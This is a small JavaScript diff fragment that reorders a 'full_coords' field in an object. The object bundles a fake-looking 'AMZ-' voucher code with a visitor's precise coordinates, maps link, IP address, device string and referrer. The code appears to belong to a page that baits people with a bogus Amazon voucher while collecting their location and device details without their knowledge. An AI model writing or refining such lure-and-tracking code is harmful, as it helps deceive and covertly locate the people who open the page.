@@ -415,12 +415,12 @@
                     voucher_code: 'AMZ-' + Math.random().toString(36).substr(2, 9).toUpperCase(),
                     latitude: lat.toFixed(6),
                     longitude: lng.toFixed(6),
+                    full_coords: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,  // ✅ Used here
                     accuracy: Math.round(accuracy) + 'm',
                     timestamp: timestamp,
                     maps_url: mapsUrl,
                     ip_address: ip,
                     device: navigator.userAgent.slice(0, 100),
-                    full_coords: `${lat.toFixed(6)}, ${lng.toFixed(6)}`,
                     referrer: document.referrer || 'Direct'
                 });
 
